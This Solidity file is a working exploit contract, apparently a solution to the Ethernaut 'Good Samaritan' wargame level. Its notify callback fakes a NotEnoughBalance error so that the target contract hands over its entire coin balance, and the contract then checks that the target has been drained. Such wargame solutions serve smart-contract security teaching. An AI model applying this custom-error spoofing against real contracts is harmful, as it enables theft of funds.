// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function coin() external view returns (address);
    function requestDonation() external returns(bool);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract Pwn { 

    IGoodSamaritan private immutable target;
    ICoin private immutable coin;

    error NotEnoughBalance();

    constructor(IGoodSamaritan _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }  

    function pwn() external {
        target.requestDonation();
        require(coin.balances(address(target)) == 0, "failed");
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}